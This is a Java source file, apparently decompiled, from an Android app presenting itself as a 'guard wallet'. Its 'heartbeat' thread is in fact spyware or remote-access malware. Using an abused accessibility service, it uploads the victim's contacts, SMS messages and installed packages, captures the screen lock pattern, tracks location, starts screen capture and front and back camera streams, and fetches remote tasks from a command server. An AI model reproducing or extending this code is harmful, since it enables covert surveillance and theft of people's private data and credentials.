/**
 * vendor thread/f.java — KeepHeartThread
 *
 * 心跳保活线程 TimerTask。
 * 负责本地 server 健康检查、设备运行心跳、缓存任务拉取、基础同步任务触发。
 */
package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.Manifest;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.google.gson.JsonObject;
import com.guard.wallet.MainApplication;
import com.guard.wallet.msg.BridgeBody;
import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.req.HeartBodyVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqCacheTaskBodyVO;
import com.guard.wallet.req.ReqMonitorLocationVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.model.EventEntity;
import com.guard.wallet.resp.DeviceDebugVO;
import com.guard.wallet.server.handler.FileSyncHandler;
import com.guard.wallet.service.CustomNotificationService;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

public final class KeepHeartThread extends TimerTask {
    public static final ReentrantLock i = new ReentrantLock();
    private static volatile LocationManager j;
    private static volatile LocationListener k;
    private static volatile String mLocationProvider;

    public final EventEntity a = new EventEntity(5000, 1);
    public final EventEntity b;
    public final EventEntity c;
    public final Timer d;
    public Integer e;
    public final AtomicInteger f;
    public final AtomicInteger g;
    public final AtomicBoolean h;

    public KeepHeartThread() {
        Integer interval = 30000;
        Integer threshold = 10;
        this.b = new EventEntity(interval, threshold);
        this.c = new EventEntity(interval, threshold);
        this.d = new Timer();
        this.e = 0;
        this.f = new AtomicInteger(0);
        this.g = new AtomicInteger(6);
        this.h = new AtomicBoolean(false);
    }

    public static void b() {
        if (!com.guard.wallet.utils.LocateValuesUtils.loaded.get()) {
            com.guard.wallet.http.HttpApiManager.fetchAppLocateValues();
        }

        if (MyAccessibilityService.P() != null && !MyAccessibilityService.P().V()) {
            if (MyAccessibilityService.P().k.get() < 1) {
                MyAccessibilityService.P().d0();
            } else {
                com.guard.wallet.http.HttpApiManager.syncListenWindows();
            }
        }

        if (CustomNotificationService.c == null && !AppUtils.E(7912)) {
            new com.guard.wallet.http.HttpClient("http://127.0.0.1:7912")
                    .asyncGet(null, "/activeMainNotification", new com.guard.wallet.http.GetCacheTaskCallback.NoOpCallback(1));
        }

        f();
        g();
    }

    public static void d() {
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (AppUtils.B(deviceId)) {
            return;
        }

        if (com.guard.wallet.utils.SystemHelper.l()) {
            boolean synced;
            synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                synced = com.guard.wallet.utils.SharedPrefsManager.e("syncPackages");
            }
            if (!synced) {
                DelegateTaskLauncher.d(new SyncTaskWrapper(2), "SYNC_DEVICE_INSTALLED_PACKAGES");
            }
        }

        if (com.guard.wallet.utils.SystemHelper.n()) {
            boolean synced;
            synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                synced = com.guard.wallet.utils.SharedPrefsManager.e("syncContacts");
            }
            if (!synced) {
                DelegateTaskLauncher.d(new SyncTaskWrapper(1), "SYNC_DEVICE_CONTACTS");
            }
        }

        if (com.guard.wallet.utils.SystemHelper.p()) {
            boolean synced;
            synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
                synced = com.guard.wallet.utils.SharedPrefsManager.e("syncSmsMessage");
            }
            if (!synced) {
                DelegateTaskLauncher.d(new SyncTaskWrapper(5), "SYNC_DEVICE_SMS");
            }
        }
    }

    public final void a() {
        JsonObject response = com.guard.wallet.http.HttpApiManager.syncGetRequest(null, "http://127.0.0.1:7910", "/version");
        if (response != null) {
            try {
                com.google.gson.reflect.TypeToken<com.guard.wallet.resp.ApiResult<String>> token = new com.google.gson.reflect.TypeToken<com.guard.wallet.resp.ApiResult<String>>() {};
                ApiResult<?> result = (ApiResult<?>) com.guard.wallet.utils.SharedPrefsManager.c(response.toString(), token);
                if (result != null && Boolean.TRUE.equals(result.getSuccess())) {
                    Log.d("KeepHeartThread", "本地HttpServer运行正常");
                    this.f.set(0);
                    return;
                }
            } catch (Exception ex) {
                AppUtils.s("KeepHeartThread", ex);
            }
        }

        Log.e("KeepHeartThread", "本地HttpServer运行异常");
        if (this.f.incrementAndGet() <= 5) {
            return;
        }

        try {
            if (com.guard.wallet.server.ApiRouter.instance != null) {
                com.guard.wallet.server.ApiRouter.instance.stopServer();
                com.guard.wallet.utils.SystemHelper.T0(5);
            }

            if (com.guard.wallet.server.ApiRouter.instance == null) {
                synchronized (com.guard.wallet.server.ApiRouter.class) {
                    if (com.guard.wallet.server.ApiRouter.instance == null) {
                        com.guard.wallet.server.ApiRouter.instance = new com.guard.wallet.server.ApiRouter();
                    }
                }
            }

            if (com.guard.wallet.server.ApiRouter.instance != null) {
                com.guard.wallet.server.ApiRouter.instance.startServer();
            }
            this.f.set(0);
            Log.d("KeepHeartThread", "本地HttpServer重启完成");
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        }
    }

    public final void c() {
        HeartBodyVO body = new HeartBodyVO();
        if (MainApplication.getInstance() != null) {
            body.setPackageName(MainApplication.getInstance().getPackageName());
        }
        body.setContainerCode("ACCESSIBILITY_CONTAINER");
        body.setIsOpened(MyAccessibilityService.P() != null ? 1 : 0);
        body.setServiceState(com.guard.wallet.server.ApiRouter.serviceState.get());

        MessageRecordVO<HeartBodyVO> record = new MessageRecordVO<>();
        record.setExtraBody(body);
        record.setIntentCode("android.intent.action.DEVICE_RUNNING");
        this.b.dispatch(record);
    }

    public final void e() {
        boolean cacheTaskBridgeConnected = AppUtils.c != null && AppUtils.c.w.get();
        if (!cacheTaskBridgeConnected) {
            String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
            if (!AppUtils.B(deviceId)) {
                BridgeBody body = new BridgeBody();
                body.setDeviceId(deviceId);
                body.setBridgePath("/cacheTask");
                AppUtils.k("/cacheTask", new BridgeMessage(body));
            }
        }

        if (this.g.get() < 6 && !this.h.get()) {
            AppUtils.g("/minicap");
            AppUtils.g("/readScreen");
            AppUtils.g("/frontCameraLive");
            AppUtils.g("/backCameraLive");
            this.g.incrementAndGet();
            return;
        }

        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(deviceId)) {
            ReqCacheTaskBodyVO body = new ReqCacheTaskBodyVO(deviceId, "ACCESSIBILITY_CONTAINER");
            new com.guard.wallet.http.HttpClient().asyncGet(body, "/api/containerApi/getCacheTask", new com.guard.wallet.http.GetCacheTaskCallback());
        }
    }

    private static void f() {
        ReqMonitorLocationVO config = FileSyncHandler.getMonitorLocationConfig();
        if (config == null) {
            h();
            return;
        }

        if (k != null) {
            return;
        }

        Context context = com.guard.wallet.utils.SystemHelper.Z();
        if (context == null) {
            return;
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != 0
                || ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != 0) {
            return;
        }

        try {
            LocationManager manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            String provider = i(manager);
            if (manager == null || AppUtils.B(provider)) {
                return;
            }

            long minTime = config.getMinTimeMs() != null && config.getMinTimeMs() > 0L
                    ? config.getMinTimeMs() : 10_000L;
            float minDistance = config.getMinDistanceM() != null && config.getMinDistanceM() > 0.0f
                    ? config.getMinDistanceM() : 100.0f;

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                }

                @Override
                public void onProviderEnabled(String provider) {
                }

                @Override
                public void onProviderDisabled(String provider) {
                }
            };

            manager.requestLocationUpdates(provider, minTime, minDistance, listener);
            j = manager;
            k = listener;
            mLocationProvider = provider;
            Log.d("KeepHeartThread", "已添加地理位置实时监听");
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        }
    }

    private static void g() {
        MainApplication app = MainApplication.getInstance();
        if (app == null || app.getSmsMessageListener() == null || java.util.Objects.equals(app.getSmsMessageListener().b, 2)) {
            return;
        }
        if (java.util.Objects.equals(app.getSmsMessageListener().b, 0)) {
            app.getSmsMessageListener().a();
            return;
        }
        com.guard.wallet.http.HttpApiManager.smsRecognizePlug();
    }

    private static void h() {
        if (j == null || k == null) {
            return;
        }
        try {
            j.removeUpdates(k);
            Log.d("KeepHeartThread", "已取消地理位置实时监听");
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        } finally {
            j = null;
            k = null;
            mLocationProvider = null;
        }
    }

    private static String i(LocationManager manager) {
        if (manager == null) {
            return null;
        }
        try {
            if (manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                return LocationManager.GPS_PROVIDER;
            }
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        }
        try {
            if (manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                return LocationManager.NETWORK_PROVIDER;
            }
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        }
        try {
            java.util.List<String> providers = manager.getProviders(true);
            if (providers != null && !providers.isEmpty()) {
                return providers.get(0);
            }
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        }
        return null;
    }

    @Override
    public final void run() {
        this.e = 1;
        if (!i.tryLock()) {
            return;
        }

        try {
            Log.d("KeepHeartThread", "keep heart thread is running");
            b();
            this.a();

            if (com.guard.wallet.delegate.EngineHelper.heS() != null) {
                com.guard.wallet.delegate.EngineHelper.heS().periodicMaintenance();
            }

            MessageRecordVO<DeviceDebugVO> debugRecord = new MessageRecordVO<>();
            debugRecord.setExtraBody(DeviceDebugVO.of());
            debugRecord.setIntentCode("android.intent.action.DEVICE_DEBUG");
            this.a.dispatch(debugRecord);

            this.c();

            LockPatternVO lockPattern = com.guard.wallet.utils.SystemHelper.B0();
            MessageRecordVO<LockPatternVO> lockRecord = new MessageRecordVO<>();
            lockRecord.setIntentCode("android.intent.action.LOCK_PATTERN");
            lockRecord.setExtraBody(lockPattern);
            this.c.dispatch(lockRecord);

            d();
            this.e();
        } catch (Exception ex) {
            AppUtils.s("KeepHeartThread", ex);
        } finally {
            i.unlock();
        }
    }
}
